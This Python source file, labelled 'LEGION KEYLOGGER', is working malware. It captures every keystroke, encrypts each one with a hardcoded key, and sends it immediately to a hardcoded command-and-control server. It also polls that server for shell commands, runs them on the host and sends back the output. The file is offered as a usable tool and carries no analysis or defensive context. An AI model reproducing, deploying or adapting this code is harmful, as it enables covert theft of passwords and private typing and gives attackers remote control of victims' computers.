#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import base64
import socket
import platform
import threading
import datetime
import subprocess
import requests
from cryptography.fernet import Fernet
from pynput import keyboard

# =====================================================================
# KONFIGURACIJA
# =====================================================================
C2_SERVER = "https://legion-c2.onrender.com"
AUTH_TOKEN = "LEGION_C2_SECURE_TOKEN_2026"
BOT_ID = socket.gethostname() + "_" + str(os.getpid())

# =====================================================================
# ENKRIPCIJA
# =====================================================================
MY_KEY = b'PLSiCRE32cI0ErE5vgqCtpGJzy5UO4h5D3UDwgbYJ-A='
cipher = Fernet(MY_KEY)
print(f"[+] Using fixed encryption key: {MY_KEY[:20]}...")

# =====================================================================
# KEYLOGGER - JEDNOSTAVNA IMPLEMENTACIJA
# =====================================================================
class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
        self.running = True
        
        # Mapa specijalnih tastera
        self.special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.delete: '[DELETE]',
            keyboard.Key.esc: '[ESC]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.shift_r: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.ctrl_r: '[CTRL]',
            keyboard.Key.alt: '[ALT]',
            keyboard.Key.alt_r: '[ALT]',
            keyboard.Key.cmd: '[WIN]',
            keyboard.Key.cmd_r: '[WIN]',
            keyboard.Key.up: '[UP]',
            keyboard.Key.down: '[DOWN]',
            keyboard.Key.left: '[LEFT]',
            keyboard.Key.right: '[RIGHT]',
            keyboard.Key.f1: '[F1]',
            keyboard.Key.f2: '[F2]',
            keyboard.Key.f3: '[F3]',
            keyboard.Key.f4: '[F4]',
            keyboard.Key.f5: '[F5]',
            keyboard.Key.f6: '[F6]',
            keyboard.Key.f7: '[F7]',
            keyboard.Key.f8: '[F8]',
            keyboard.Key.f9: '[F9]',
            keyboard.Key.f10: '[F10]',
            keyboard.Key.f11: '[F11]',
            keyboard.Key.f12: '[F12]',
        }
        
        print(f"[+] KeyLogger started on {BOT_ID}")
        print(f"[+] C2 Server: {C2_SERVER}")
        print("[+] Press any key to test...")
        
        # Pokreni listener za tipke
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print("[+] Keyboard listener started!")
        
        # Pokreni heartbeat u posebnom thread-u
        self.heartbeat_thread = threading.Thread(target=self.heartbeat_loop)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        
        # Pokreni command listener u posebnom thread-u
        self.command_thread = threading.Thread(target=self.command_loop)
        self.command_thread.daemon = True
        self.command_thread.start()
    
    def on_press(self, key):
        """Poziva se svaki put kad pritisneš tipku - ŠALJE ODMAH!"""
        try:
            # Dohvati karakter
            if hasattr(key, 'char') and key.char is not None:
                char = key.char
            else:
                char = self.special_keys.get(key, f'[{str(key)}]')
            
            # Ispiši šta je pritisnuto
            print(f"[KEY] {char}")
            
            # POŠALJI ODMAH - bez čekanja!
            self.send_key(char)
                    
        except Exception as e:
            print(f"[-] Key press error: {e}")
    
    def send_key(self, char):
        """Šalje jedan karakter na server"""
        try:
            # Enkriptuj karakter
            encrypted = cipher.encrypt(char.encode('utf-8'))
            encoded = base64.b64encode(encrypted).decode('utf-8')
            
            payload = {
                "id": BOT_ID,
                "data": encoded,
                "timestamp": datetime.datetime.now().isoformat()
            }
            
            headers = {
                "Authorization": f"Bearer {AUTH_TOKEN}",
                "Content-Type": "application/json"
            }
            
            print(f"[*] Sending '{char}' to server...")
            response = requests.post(
                f"{C2_SERVER}/keylog",
                json=payload,
                headers=headers,
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"[+] Sent '{char}' to C2")
            else:
                print(f"[-] Server error: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Send error: {e}")
    
    def heartbeat_loop(self):
        while self.running:
            try:
                response = requests.get(
                    f"{C2_SERVER}/api/bots",
                    headers={"Authorization": f"Bearer {AUTH_TOKEN}"},
                    timeout=5
                )
                if response.status_code == 200:
                    print("[+] Heartbeat OK")
                else:
                    print(f"[-] Heartbeat failed: {response.status_code}")
            except Exception as e:
                print(f"[-] Heartbeat failed: {e}")
            time.sleep(30)
    
    def command_loop(self):
        while self.running:
            try:
                response = requests.get(
                    f"{C2_SERVER}/command",
                    params={"id": BOT_ID},
                    headers={"Authorization": f"Bearer {AUTH_TOKEN}"},
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('command'):
                        command_id = data.get('command_id')
                        command = data.get('command')
                        print(f"[+] Received command: {command}")
                        
                        result = self.execute_command(command)
                        self.send_result(command_id, result)
                else:
                    print(f"[-] Command fetch error: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Command loop error: {e}")
            
            time.sleep(5)
    
    def execute_command(self, command):
        try:
            parts = command.split()
            if not parts:
                return "No command"
            
            result = subprocess.run(
                parts,
                capture_output=True,
                text=True,
                shell=(platform.system() == "Windows")
            )
            
            output = result.stdout + result.stderr
            if not output:
                output = "Command executed successfully (no output)"
            
            return output
            
        except Exception as e:
            return f"Command execution error: {str(e)}"
    
    def send_result(self, command_id, result):
        try:
            payload = {
                "command_id": command_id,
                "result": result,
                "status": "completed"
            }
            
            response = requests.post(
                f"{C2_SERVER}/result",
                json=payload,
                headers={
                    "Authorization": f"Bearer {AUTH_TOKEN}",
                    "Content-Type": "application/json"
                },
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Command result sent for ID: {command_id}")
            else:
                print(f"[-] Failed to send result: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Send result error: {e}")
    
    def stop(self):
        self.running = False
        self.listener.stop()
        print("[+] KeyLogger stopped")

# =====================================================================
# MAIN
# =====================================================================
def main():
    print("="*50)
    print("🐉 LEGION KEYLOGGER")
    print("="*50)
    print(f"Bot ID: {BOT_ID}")
    print(f"Platform: {platform.system()} {platform.release()}")
    print(f"Python: {sys.version}")
    print("="*50)
    
    # Provjeri pynput
    try:
        import pynput
        print("[+] pynput loaded successfully")
    except ImportError:
        print("[!] pynput not found! Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
        print("[+] pynput installed. Restarting...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
        return
    
    keylogger = KeyLogger()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping keylogger...")
        keylogger.stop()
        sys.exit(0)

if __name__ == "__main__":
    main()
